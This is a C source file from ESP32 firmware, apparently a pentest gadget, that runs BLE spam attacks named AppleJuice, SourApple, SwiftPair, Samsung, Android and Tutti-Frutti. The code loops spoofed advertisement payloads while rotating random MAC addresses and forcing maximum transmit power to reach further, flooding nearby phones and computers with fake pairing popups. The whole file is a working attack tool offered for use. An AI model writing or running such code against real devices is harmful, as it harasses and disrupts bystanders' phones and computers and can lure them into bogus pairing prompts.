// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

/**
 * BLE Spam Indices:
 * 0: AppleJuice (Airpods, Beats, etc)
 * 1: SourApple (AppleTV Setup, Phone Setup, etc)
 * 2: SwiftPair (Microsoft Windows popups)
 * 3: Samsung (Samsung Watch/Galaxy popups)
 * 4: Android (Google Fast Pair)
 * 5: Tutti-Frutti (Cycles through all above)
 */

#include "canned_spam.h"
#include "apple_juice_spam.h"
#include "sour_apple_spam.h"
#include "swift_pair_spam.h"
#include "samsung_spam.h"
#include "android_spam.h"
#include "tutti_frutti_spam.h"
#include "bluetooth_service.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/ble_hs_id.h"
#include "esp_log.h"
#include <string.h>

static const char *TAG = "CANNED_SPAM";

typedef enum {
  CAT_APPLE_JUICE = 0,
  CAT_SOUR_APPLE,
  CAT_SWIFT_PAIR,
  CAT_SAMSUNG,
  CAT_ANDROID,
  CAT_TUTTI_FRUTTI,
  CAT_COUNT
} SpamCategory;

static const SpamType category_info[] = {
  {"AppleJuice"},
  {"SourApple"},
  {"SwiftPair"},
  {"Samsung"},
  {"Android"},
  {"Tutti-Frutti"}
};

static bool spam_running = false;
static int current_category = -1;
static TaskHandle_t spam_task_handle = NULL;


static void spam_task(void *pvParameters) {
  ESP_LOGI(TAG, "Spam Task Started for category %d", current_category);

  struct ble_gap_adv_params adv_params;
  memset(&adv_params, 0, sizeof(adv_params));
  adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
  adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
  adv_params.itvl_min = 32; // 20ms
  adv_params.itvl_max = 48; // 30ms

  uint8_t payload_buffer[32];

  while (spam_running) {
    int payload_len = 0;

    switch (current_category) {
      case CAT_APPLE_JUICE:
        payload_len = generate_apple_juice_payload(payload_buffer, sizeof(payload_buffer));
        break;
      case CAT_SOUR_APPLE:
        payload_len = generate_sour_apple_payload(payload_buffer, sizeof(payload_buffer));
        break;
      case CAT_SWIFT_PAIR:
        payload_len = generate_swift_pair_payload(payload_buffer, sizeof(payload_buffer));
        break;
      case CAT_SAMSUNG:
        payload_len = generate_samsung_payload(payload_buffer, sizeof(payload_buffer));
        break;
      case CAT_ANDROID:
        payload_len = generate_android_payload(payload_buffer, sizeof(payload_buffer));
        break;
      case CAT_TUTTI_FRUTTI:
        payload_len = generate_tutti_frutti_payload(payload_buffer, sizeof(payload_buffer));
        break;
      default:
        payload_len = 0;
        break;
    }

    if (payload_len <= 0) {
      vTaskDelay(pdMS_TO_TICKS(10));
      continue;
    }

    ble_addr_t rnd_addr;
    ble_hs_id_gen_rnd(0, &rnd_addr);
    ble_hs_id_set_rnd(rnd_addr.val);

    int rc = ble_gap_adv_set_data(payload_buffer, payload_len);
    if (rc != 0) {}

    rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &adv_params, NULL, NULL);

    // wait loop delay
    vTaskDelay(pdMS_TO_TICKS(150));

    ble_gap_adv_stop();

    vTaskDelay(pdMS_TO_TICKS(50));
  }

  spam_task_handle = NULL;
  vTaskDelete(NULL);
}



int spam_get_attack_count(void) {
  return CAT_COUNT;
}

const SpamType* spam_get_attack_type(int index) {
  if (index < 0 || index >= CAT_COUNT) {
    return NULL;
  }
  return &category_info[index];
}

esp_err_t spam_start(int attack_index) {
  if (spam_running) {
    return ESP_ERR_INVALID_STATE;
  }

  if (!bluetooth_service_is_running()) {
    ESP_LOGE(TAG, "Bluetooth service is not running");
    return ESP_FAIL;
  }

  if (attack_index < 0 || attack_index >= CAT_COUNT) {
    return ESP_ERR_NOT_FOUND;
  }

  bluetooth_service_stop_advertising();

  // Garante potência máxima para o spam ir mais longe
  bluetooth_service_set_max_power();

  current_category = attack_index;
  spam_running = true;

  xTaskCreate(spam_task, "spam_task", 4096, NULL, 5, &spam_task_handle);

  ESP_LOGI(TAG, "Spam started for category: %s", category_info[attack_index].name);
  return ESP_OK;
}

esp_err_t spam_stop(void) {
  if (!spam_running) {
    return ESP_ERR_INVALID_STATE;
  }

  spam_running = false;

  if (spam_task_handle != NULL) {
    int retry = 10;
    while (spam_task_handle != NULL && retry > 0) {
      vTaskDelay(pdMS_TO_TICKS(50));
      retry--;
    }
  }

  if (ble_gap_adv_active()) {
    ble_gap_adv_stop();
  }

  ESP_LOGI(TAG, "Spam stopped");
  return ESP_OK;
}
